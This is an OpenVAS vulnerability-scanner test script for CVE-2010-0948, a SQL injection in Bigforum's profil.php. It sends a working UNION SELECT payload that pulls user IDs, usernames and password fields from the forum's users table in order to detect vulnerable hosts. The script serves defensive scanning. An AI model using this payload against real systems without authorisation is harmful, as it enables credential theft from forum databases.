##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_bigforum_sql_inj_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# Bigforum 'profil.php' SQL Injection Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to execute arbitrary SQL
  statements on the vulnerable system, which may lead to view, add, modify
  data, or delete information in the back-end database.
  Impact Level: Application.

  NOTE: Successful exploitation requires that 'magic_quotes_gpc' is disabled.";
tag_affected = "Bigforum version 4.5 and prior";

tag_insight = "The flaw exists in 'profil.php'. Input passed to the 'id' parameter is not
  properly sanitised before being used in SQL queries. A remote attacker can
  execute arbitrary SQL commands.";
tag_solution = "No solution or patch is available as of 17th March 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.bfs.kilu.de/";
tag_summary = "This host is running Bigforum and is prone to SQL Injection
  vulnerability.";

if(description)
{
  script_id(801151);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-03-18 15:44:57 +0100 (Thu, 18 Mar 2010)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_bugtraq_id(38597);
  script_cve_id("CVE-2010-0948");
  script_name("Bigforum 'profil.php' SQL Injection Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/38872");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/56723");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/11646");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/1003-exploits/bigforum-sql.txt");

  script_description(desc);
  script_summary("Check through the attack string on Bigforum");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}


include("http_func.inc");

## Get HTTP port
bigPort = get_http_port(default:80);
if(!bigPort){
  exit(0);
}

## Check for the exploit on Bigforum
foreach dir (make_list("/bigforum", "/bf", "/" , cgi_dirs()))
{
  sndReq = http_get(item:string(dir, "/index.php"), port:bigPort);
  rcvRes = http_send_recv(port:bigPort, data:sndReq);

  if(">Bigforum" >< rcvRes)
  {
    ## Send an exploit and recieve the response
    sndReq = http_get(item:string(dir, "/profil.php?id=-1'+union+select+1," +
                      "concat(0x3a3a3a,id,0x3a,username,0x3a,pw,0x3a3a3a)," +
                      "3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22," +
                      "23,24,25,26,27,28,29+from+users+--+"), port:bigPort);
    rcvRes = http_send_recv(port:bigPort, data:sndReq);

    ## Check the response for SQL cmds results
    if((rcvRes =~ ":::.:admin:"))
    {
      security_hole(bigPort);
      exit(0);
    }
  }
}
